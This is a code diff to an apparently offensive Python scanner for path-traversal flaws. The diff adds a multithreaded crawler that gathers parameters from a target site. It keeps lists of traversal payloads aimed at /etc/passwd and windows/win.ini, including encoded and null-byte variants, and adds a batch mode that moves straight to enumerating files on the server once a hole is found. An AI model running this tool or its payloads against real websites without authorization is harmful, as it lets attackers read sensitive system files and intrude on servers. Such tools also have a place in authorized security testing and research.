@@ -1,7 +1,11 @@
-import re, tldextract, os
+import re, tldextract, os, threading
 from urllib.parse import (urlparse, parse_qs, urljoin, urlencode, urlunparse, urlsplit, urlunsplit, parse_qsl, quote)
 from bs4 import BeautifulSoup
 from collections import deque
+from concurrent.futures import ThreadPoolExecutor
+from queue import Queue, Empty
+from threading import Lock
+from urllib.parse import urlparse, urljoin, urlunsplit
 from Dependencies.displays import M, W, R, Y, G, C, handle_error
 from Dependencies.get_request import get_request
 
@@ -50,14 +54,16 @@ base_linux = [
 ]
 
 base_windows = [
-    "..\..\..\..\..\..\windows\win.ini",                                        # windows_traversals_classic
-    "..\\..\\..\\..\\..\\..\\windows\\win.ini",                                 # windows_double_classic
-    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini",                            # windows_traversals_1_encoded
+    r"..\..\..\..\..\..\windows\win.ini",                                        # windows_traversals_classic
+    r"..\\..\\..\\..\\..\\..\\windows\\win.ini",                                 # windows_double_classic
+    r"..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini",                            # windows_traversals_1_encoded
     "%252e%252e%255c%252e%252e%255cwindows/win.ini",                            # windows_traversals_2_encoded
-    "..\\..//..\\..//..\\windows\\win.ini",                                     # windows_traversals_3_encoded
-    "....\\\\....\\\\....\\\\windows\\win.ini",                                 # windows_traversals_4_encoded
+    r"..\\..//..\\..//..\\windows\\win.ini",                                     # windows_traversals_3_encoded
+    r"....\\\\....\\\\....\\\\windows\\win.ini",                                 # windows_traversals_4_encoded
     "C:\\windows\\win.ini"                                                      # windows_traversals_base
 ]
+
+
 
 # ----------------------------
 # HELPERS
@@ -142,6 +148,9 @@ def extract_endpoint_context(url: str):
     return path.split("/")[-1]
 
 def build_context_payloads(param_name: str):
+    if not param_name:
+        return []
+        
     payloads = [
         f"/var/www/{param_name}/../../../../../../etc/passwd",
         f"/{param_name}/../../../../../../etc/passwd",
@@ -196,15 +205,11 @@ def is_vulnerable(response_text, url):
     username = extract.domain
     signatures = [
         "root:x:",
-        f"{username}:",
         "/bin/bash",
         "/usr/sbin",
         "daemon:",
         "syslog:",
-        "[fonts]",
-        "Microsoft Windows",
-        "etc/passwd",
-        "win.ini"
+        "[fonts]"
     ]
     return any(sig in response_text for sig in signatures)
 
@@ -218,137 +223,248 @@ def is_crawlable(url):
         return False
     return True
 
-def crawl_extract(args, start_url, max_depth=2):
-    queue = deque([(start_url, 0)])
+
+
+
+def crawl_extract(args, start_url, max_depth=2, workers=25):
+
+    q = Queue()
+    q.put((start_url, 0))
+
     seen = set()
     visited = set()
     results = {}
+
+    seen_lock = Lock()
+    visited_lock = Lock()
+    results_lock = Lock()
+
     allowed_domains = set()
 
+    # =========================================================
     # INIT DOMAIN
-    res = get_request(args, start_url)
-    allowed_domains.add(urlparse(start_url).netloc)
-    allowed_domains.add(urlparse(res.url).netloc)
-    
+    # =========================================================
+    try:
+
+        res = get_request(args, start_url)
+
+        allowed_domains.add(
+            normalize_netloc(
+                urlparse(start_url).netloc
+            )
+        )
+
+        if res is not None:
+
+            allowed_domains.add(
+                normalize_netloc(
+                    urlparse(res.url).netloc
+                )
+            )
+
+    except Exception as e:
+
+        handle_error(
+            e,
+            "INIT ERROR",
+            args.verbose
+        )
+
+        return {}
+
     if args.verbose:
-        print(f"{G}[+] {W}Allowed domains: {allowed_domains}")
+        print(
+            f"{G}[+] {W}Allowed domains: "
+            f"{allowed_domains}"
+        )
 
-    while queue:
-        url, depth = queue.popleft()
-        if depth > max_depth:
-            continue
+    # =========================================================
+    # WORKER
+    # =========================================================
+    def worker():
+        while True:
+            try:
+                url, depth = q.get(timeout=2)
+            except Empty:
+                return
 
-        url = canonicalize_url(url)
-        if url in seen:
-            continue
-
-        seen.add(url)
-        parsed = urlparse(url)
-        is_static = url.lower().endswith(tuple(SKIP_EXTENSIONS))
-        has_params = bool(parsed.query)
-
-        # =========================================================
-        # STORE ENDPOINTS
-        # =========================================================
-        params = extract_params(url)
-        suspicious = is_interesting_url(url)
-        if params or suspicious or has_params:
-            base = urlunsplit((
-                parsed.scheme,
-                parsed.netloc,
-                parsed.path,
-                "",
-                ""
-            ))
-
-            if base not in results:
-                results[base] = {
-                    "params": set(),
-                    "suspicious": False,
-                    "examples": {}
-                }
-
-            results[base]["params"].update(params)
-            for p in params:
-                if p not in results[base]["examples"]:
-                    results[base]["examples"][p] = url
-            results[base]["suspicious"] |= suspicious
-
-        # =========================================================
-        # SKIP STATIC
-        # =========================================================
-        if is_static and not has_params:
-            if args.verbose:
-                print(f"{Y}[SKIP STATIC] {W}{url}")
-            continue
-
-        if url.lower().endswith(tuple(SKIP_EXTENSIONS)):
-            if args.verbose:
-                print(f"{Y}[SKIP STATIC PARAMETER] {W}{url}")
-            continue
-
-        # =========================================================
-        # REQUEST
-        # =========================================================
-        try:
-            res = get_request(args, url)
-        except Exception as e:
-            handle_error(e, "REQUEST ERROR", args.verbose)
-            continue
-
-        if res is None:
-            if args.verbose:
-                print(f"{R}[NULL RESPONSE] {W}{url}")
-            continue
-
-        if args.verbose:
-            print(f"{Y}[HTTP] {W}{res.status_code} (DEPTH={depth}) -> {url}")
-        
-        if res.status_code >= 500:
-            continue
-
-        is_html = "text/html" in res.headers.get("Content-Type", "")
-        if not is_html:
-            continue
-
-        visited.add(url)
-        soup = BeautifulSoup(res.text, "html.parser")
-
-        # =========================================================
-        # LINK EXTRACTION
-        # =========================================================
-        for tag, attr in [("a", "href"), ("form", "action"), ("img", "src")]:
-            for el in soup.find_all(tag):
-                link = el.get(attr)
-                if not link:
+            try:
+                if depth > max_depth:
                     continue
 
-                if link.startswith(("javascript:", "mailto:", "tel:", "#")):
+                url = canonicalize_url(url)
+                with seen_lock:
+                    if url in seen:
+                        continue
+
+                    seen.add(url)
+                parsed = urlparse(url)
+
+                # =================================================
+                # SKIP STATIC FILES
+                # =================================================
+                if is_static_resource(url):
+                    if args.verbose:
+                        print(f"{Y}[SKIP STATIC]{W} {url}")
                     continue
 
-                full = canonicalize_url(urljoin(url, link.split("#")[0]))
-                parsed_link = urlparse(full)
+                # =================================================
+                # STORE INTERESTING ENDPOINTS
+                # =================================================
+                raw_params = extract_params(url)
+                interesting_params = {p for p in raw_params if p.lower() in INTERESTING_PARAMS}
+                suspicious = is_interesting_url(url)
+                if interesting_params or suspicious:
+                    base = urlunsplit((
+                        parsed.scheme,
+                        parsed.netloc,
+                        parsed.path,
+                        "",
+                        ""
+                    ))
 
-                if not is_allowed_domain(parsed_link.netloc, allowed_domains):
+                    with results_lock:
+                        if base not in results:
+                            results[base] = {
+                                "params": set(),
+                                "suspicious": False,
+                                "examples": {}
+                            }
+
+                        results[base]["params"].update(
+                            interesting_params
+                        )
+
+                        for p in interesting_params:
+                            results[base]["examples"].setdefault(
+                                p,
+                                url
+                            )
+
+                        results[base]["suspicious"] |= (
+                            suspicious
+                        )
+
+                # =================================================
+                # REQUEST
+                # =================================================
+                try:
+                    res = get_request(
+                        args,
+                        url
+                    )
+                except Exception as e:
+                    handle_error(
+                        e,
+                        "REQUEST ERROR",
+                        args.verbose
+                    )
                     continue
-                
-                if not is_valid_http_url(full):
+
+                if res is None:
+                    if args.verbose:
+                        print(
+                            f"{R}[NULL RESPONSE]{W} "
+                            f"{url}"
+                        )
                     continue
 
-                link_is_static = full.lower().endswith(tuple(SKIP_EXTENSIONS))
-                link_has_params = bool(parsed_link.query)
+                if args.verbose:
+                    print(
+                        f"{Y}[HTTP]{W} "
+                        f"{res.status_code} "
+                        f"(DEPTH={depth}) -> {url}"
+                    )
 
-                if link_is_static and not link_has_params:
+                if res.status_code >= 500:
                     continue
 
-                if depth + 1 > max_depth:
+                content_type = (
+                    res.headers.get(
+                        "Content-Type",
+                        ""
+                    )
+                    .lower()
+                )
+
+                if "text/html" not in content_type:
                     continue
 
-                if full not in seen:
-                    queue.append((full, depth + 1))
+                with visited_lock:
+                    visited.add(url)
+
+                soup = BeautifulSoup(
+                    res.text,
+                    "html.parser"
+                )
+
+                # =================================================
+                # LINK EXTRACTION
+                # =================================================
+                for tag, attr in (
+                    ("a", "href"),
+                    ("form", "action")
+                ):
+
+                    for el in soup.find_all(tag):
+                        link = el.get(attr)
+                        if not link:
+                            continue
+
+                        if link.startswith((
+                            "javascript:",
+                            "mailto:",
+                            "tel:",
+                            "#"
+                        )):
+                            continue
+
+                        full = canonicalize_url(
+                            urljoin(
+                                url,
+                                link.split("#")[0]
+                            )
+                        )
+
+                        if not is_valid_http_url(full):
+                            continue
+
+                        parsed_link = urlparse(full)
+                        if not is_allowed_domain(
+                            parsed_link.netloc,
+                            allowed_domains
+                        ):
+                            continue
+
+                        # ============================
+                        # NEVER FOLLOW ASSETS
+                        # ============================
+                        if is_static_resource(full):
+                            continue
+
+                        if depth + 1 > max_depth:
+                            continue
+
+                        q.put(
+                            (
+                                full,
+                                depth + 1
+                            )
+                        )
+            finally:
+                q.task_done()
+
+    # =========================================================
+    # START THREADS
+    # =========================================================
+    with ThreadPoolExecutor(max_workers=workers) as executor:
+        for _ in range(workers):
+            executor.submit(worker)
+        q.join()
+
     print(f"\n{G}[+] Crawl finished")
     print(f"{G}[+] {W}Pages: {len(visited)}")
-    print(f"{G}[+] {W}Endpoints: {len(results)}")
+    print(f"{G}[+] {W}Endpoints: {len(results)}\n")
     return results
 
 # ----------------------------
@@ -454,7 +570,8 @@ def test_traversal(args, base_url, param, os_type):
     payloads = build_payloads(os_type)
     if not os_type == "windows":
         context = extract_endpoint_context(base_url)
-        payloads += build_context_payloads(context)
+        if context is not None:
+            payloads += build_context_payloads(context)
         ext = extract_param_extension(base_url, param)
         if ext:
             payloads += build_nullbyte_payloads(ext)
@@ -483,10 +600,15 @@ def test_traversal(args, base_url, param, os_type):
         r = get_request(args, url)
         if is_vulnerable(r.text, clean_base):
             print(f"{R}[VULNERABLE] {W}{url}")
-            user_input = input(f"\n{Y}[?] Enum existing files? (y/n): {C}").strip().lower()
-            if user_input in ("y", "yes"):
+            if args.batch:
+                print(f"\n{Y}[?] Enum existing files? (y/n): {C}y")
                 gimelove(args, clean_base, payload, ext, param, context)
                 break
             else:
-                handle_error("Invalid user input", "ERROR", args.verbose)
-                break
+                user_input = input(f"\n{Y}[?] Enum existing files? (y/n): {C}").strip().lower()
+                if user_input in ("y", "yes"):
+                    gimelove(args, clean_base, payload, ext, param, context)
+                    break
+                else:
+                    handle_error("Invalid user input", "ERROR", args.verbose)
+                    break
